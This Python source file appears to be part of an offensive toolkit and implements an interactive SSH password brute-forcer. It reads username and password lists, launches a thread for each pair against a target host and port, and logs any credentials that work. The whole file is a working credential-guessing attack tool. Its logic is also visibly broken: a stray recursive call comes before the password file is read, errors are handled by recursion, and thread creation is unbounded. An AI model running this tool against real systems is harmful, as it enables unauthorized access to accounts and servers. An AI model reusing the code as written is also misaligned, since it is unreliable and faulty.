import os
import sys
import paramiko
import time
import argparse
import logging
import threading
import itertools
import subprocess



def sys_arg_cleaner():
    prog_name = sys.argv[0]
    sys.argv.clear()
    sys.argv.append(prog_name)

def ssh_bruteforce():
    choice = 1000
    sys_arg_cleaner()
    while (choice != "exit"):
        print("type 'exit' to go back.")
        print("""-h or --help for help""")
        print("\033[4mktool\033[0m" + "> ", end="")
        arguments = input()
        if (arguments == "exit"):
            return

        sys.argv += arguments.split()

        try:
            parser = argparse.ArgumentParser(exit_on_error=False, usage="-t TARGET -p PORT -u USERNAMES -w PASSWORDS")
            parser.add_argument("-t", "--target", help="Target IP address", required=True)
            parser.add_argument("-p", "--port", help="Target port", required=True)
            parser.add_argument("-u", "--usernames", help="Usernames file", required=True)
            parser.add_argument("-w", "--passwords", help="Passwords file", required=True)
            args= parser.parse_args()
        except:
            time.sleep(0.1)
            ssh_bruteforce()
            return
        logging.basicConfig(filename='ssh_brute_force.log', level=logging.INFO)

        try:
            with open(args.usernames) as f:
                usernames = f.read().splitlines()
            ssh_bruteforce()
            with open(args.passwords) as f:
                passwords = f.read().splitlines()
        except argparse.ArgumentTypeError as e:
            print(e)
            ssh_bruteforce()
            return
        except argparse.ArgumentError as e:
            print(e)
            ssh_bruteforce()
            return
        except:
            print("the specified usernames/passwords file doesn't exist")
            ssh_bruteforce()
            return

        def try_login(username, password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(args.target, port=args.port, username=username, password=password)
                print(f"[+] Login Successful! {username}:{password}")
                logging.info(f"[+] Login Successful! {username}:{password}")
                ssh.close()
            except paramiko.ssh_exception.AuthenticationException:
                print(f"[-] Login Failed! {username}:{password}")
            except paramiko.ssh_exception.SSHException as e:
                print("An error has occured : ", e)
                pass

        for username in usernames:
            for password in passwords:
                t = threading.Thread(target=try_login, args=(username, password))
                t.start()
